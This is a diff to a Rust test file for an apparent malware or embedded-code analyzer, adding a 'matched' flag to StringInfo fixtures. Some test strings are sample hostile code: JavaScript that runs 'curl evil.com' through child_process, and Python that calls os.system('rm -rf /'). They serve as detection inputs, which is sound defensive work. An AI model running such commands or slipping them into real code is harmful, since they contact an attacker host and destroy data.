@@ -24,13 +24,14 @@ fn make_capability_mapper() -> Arc<CapabilityMapper> {
 
 fn make_string_info(value: &str) -> StringInfo {
     StringInfo {
-        value: value.to_string(),
+        value: (value.to_string()).into(),
         offset: Some(0),
         string_type: None,
         encoding: "utf-8".to_string(),
         section: None,
         encoding_chain: Vec::new(),
         fragments: None,
+        matched: std::sync::atomic::AtomicBool::new(false),
     }
 }
 
@@ -136,13 +137,14 @@ fn test_analyze_hex_encoded_javascript() {
     let js_code = "const evil = require('child_process'); evil.exec('curl evil.com');";
 
     let string_info = StringInfo {
-        value: js_code.to_string(),
+        value: (js_code.to_string()).into(),
         offset: Some(0),
         string_type: None,
         encoding: "utf-8".to_string(),
         section: Some("test".to_string()),
         encoding_chain: vec!["hex".to_string()],
         fragments: None,
+        matched: std::sync::atomic::AtomicBool::new(false),
     };
 
     let capability_mapper = make_capability_mapper();
@@ -181,13 +183,14 @@ fn test_analyze_plain_embedded_python() {
     let py_code = "import os\nimport sys\ndef evil():\n    os.system('rm -rf /')\n    sys.exit(0)";
 
     let string_info = StringInfo {
-        value: py_code.to_string(),
+        value: (py_code.to_string()).into(),
         offset: Some(0x5000),
         string_type: None,
         encoding: "utf-8".to_string(),
         section: Some("test".to_string()),
         encoding_chain: vec![], // No encoding - plain embedded
         fragments: None,
+        matched: std::sync::atomic::AtomicBool::new(false),
     };
 
     let capability_mapper = make_capability_mapper();
@@ -222,13 +225,14 @@ fn test_max_depth_limit() {
     let js_code = "const x = require('fs'); x.readFile('test');";
 
     let string_info = StringInfo {
-        value: js_code.to_string(),
+        value: (js_code.to_string()).into(),
         offset: Some(0),
         string_type: None,
         encoding: "utf-8".to_string(),
         section: Some("test".to_string()),
         encoding_chain: vec!["hex".to_string()],
         fragments: None,
+        matched: std::sync::atomic::AtomicBool::new(false),
     };
 
     let capability_mapper = make_capability_mapper();
